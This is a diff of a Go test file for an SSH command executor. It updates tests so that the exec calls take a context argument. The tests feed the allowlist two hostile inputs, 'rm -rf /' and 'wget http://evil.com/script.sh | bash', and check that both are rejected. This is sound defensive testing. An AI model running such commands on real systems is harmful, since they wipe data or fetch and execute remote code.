@@ -1,6 +1,7 @@
 package executor
 
 import (
+	"context"
 	"strings"
 	"testing"
 
@@ -150,7 +151,7 @@ func TestKnownHostsEmpty(t *testing.T) {
 
 func TestExecReadonlyRejectsNotAllowed(t *testing.T) {
 	e := newSSHExec(defaultSSHConfig())
-	_, err := e.ExecReadonly("node1", "rm -rf /")
+	_, err := e.ExecReadonly(context.Background(), "node1", "rm -rf /")
 	if err == nil {
 		t.Fatal("ExecReadonly should reject command not in allowlist")
 	}
@@ -161,7 +162,7 @@ func TestExecReadonlyRejectsNotAllowed(t *testing.T) {
 
 func TestExecRejectsNotAllowed(t *testing.T) {
 	e := newSSHExec(defaultSSHConfig())
-	_, err := e.Exec("node1", "wget http://evil.com/script.sh | bash")
+	_, err := e.Exec(context.Background(), "node1", "wget http://evil.com/script.sh | bash")
 	if err == nil {
 		t.Fatal("Exec should reject command not in combined allowlist")
 	}
@@ -176,7 +177,7 @@ func TestExecNoKeys(t *testing.T) {
 	// ExecReadonly passes allowlist check but then fails because no keys are loaded.
 	e := newSSHExec(defaultSSHConfig())
 	// e.signers is nil/empty
-	_, err := e.ExecReadonly("node1", "df -h")
+	_, err := e.ExecReadonly(context.Background(), "node1", "df -h")
 	if err == nil {
 		t.Fatal("exec should fail with no SSH keys loaded")
 	}
